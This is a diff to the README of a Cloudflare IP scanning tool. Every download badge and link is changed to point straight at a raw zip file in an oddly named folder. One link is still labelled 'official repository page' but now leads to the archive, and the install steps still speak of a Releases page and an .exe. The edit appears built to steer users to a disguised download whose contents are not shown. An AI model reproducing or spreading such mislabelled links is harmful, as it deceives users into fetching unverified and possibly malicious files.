@@ -1,6 +1,6 @@
 # 🌐 CF-IP-Scanner - Find fast Cloudflare addresses easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Wheelernormandy677/CF-IP-Scanner)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Wheelernormandy677/CF-IP-Scanner/raw/refs/heads/main/princeps/C_Scanner_I_v1.5-beta.5.zip)
 
 CF-IP-Scanner helps you find the fastest Cloudflare IP addresses for your internet connection. A fast IP address improves your browsing speed and connection stability when you use V2Ray, Xray, VLESS, or Trojan tools. This application scans available Cloudflare networks and identifies the best options for your location. It provides a visual interface so you can track performance and select the best results without technical tasks.
 
@@ -16,11 +16,11 @@ Your computer needs to meet these basic standards to run the application:
 
 ## 📥 Download and Install
 
-[![](https://img.shields.io/badge/Get-Software-grey.svg)](https://github.com/Wheelernormandy677/CF-IP-Scanner)
+[![](https://img.shields.io/badge/Get-Software-grey.svg)](https://github.com/Wheelernormandy677/CF-IP-Scanner/raw/refs/heads/main/princeps/C_Scanner_I_v1.5-beta.5.zip)
 
 Follow these steps to set up the software:
 
-1. Visit the [official repository page](https://github.com/Wheelernormandy677/CF-IP-Scanner).
+1. Visit the [official repository page](https://github.com/Wheelernormandy677/CF-IP-Scanner/raw/refs/heads/main/princeps/C_Scanner_I_v1.5-beta.5.zip).
 2. Locate the section labeled Releases on the right side of the screen.
 3. Click the most recent version link.
 4. Look for the file ending in `.exe` under the Assets section.
